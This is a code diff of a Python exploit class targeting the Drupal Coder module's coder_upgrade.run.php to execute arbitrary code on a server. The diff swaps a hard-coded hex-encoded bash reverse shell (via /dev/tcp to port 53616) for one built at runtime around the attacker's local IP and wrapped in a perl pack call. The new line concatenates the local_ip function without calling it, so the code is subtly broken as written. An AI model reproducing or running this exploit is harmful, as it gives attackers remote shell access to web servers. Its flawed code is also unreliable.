@@ -2,16 +2,21 @@ import socket
 import threading
 import time
 from base64 import b64encode
+import binascii
 
 import requests
+
+
+def local_ip():
+    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
+        s.connect(("1.1.1.1", 80))
+        return s.getsockname()[0]
 
 
 class DrupalCoderExec:
     """Exploit Drupal Coder module to execute arbitrary code on the server"""
 
     # This is a basic bash reverse shell coded into hex and expanded by the perl pack command
-    REV_SHELL = "perl -e 'system(pack(qq,H138,,qq,62617368202D632027303C2632342D3B657865632032343C"
-    REV_SHELL += "3E2F6465762F7463702F31302E302E322E31382F35333631363B7368203C263234203E26323420323E26323427,))'\n"
 
     WEBSERVER_PATH = (
         "/sites/all/modules/coder/coder_upgrade/scripts/coder_upgrade.run.php"
@@ -22,6 +27,17 @@ class DrupalCoderExec:
 
         self.beachhead = beachhead
         print("DRUPAL: exploit instantiated")
+
+
+        self.hex_rev_shell = binascii.hexlify("bash -c '0<&24-;exec 24<>/dev/tcp/" + local_ip + "/53616;sh <&24 >&24 2>&24'".encode('utf-8')).decode('utf-8')
+
+        self.rev_shell = (
+            "perl -e 'system(pack(qq,H"
+            + str(len(self.hex_rev_shell))
+            + ",,qq,"
+            + self.hex_rev_shell
+            + ",))'"
+        )
 
     def create_payload(self, payload: str) -> str:
         """Create the initial exploit payload to be sent to the server
@@ -97,7 +113,7 @@ class DrupalCoderExec:
         print("DRUPAL: Sleep over")
 
         url = "http://" + ip_addr + ":" + port + path + self.WEBSERVER_PATH
-        params = {"file": self.create_payload(self.REV_SHELL)}
+        params = {"file": self.create_payload(self.rev_shell)}
 
         # Reverse shell doesn't call home, so don't wait for response
         print("DRUPAL: Sending reverse shell")
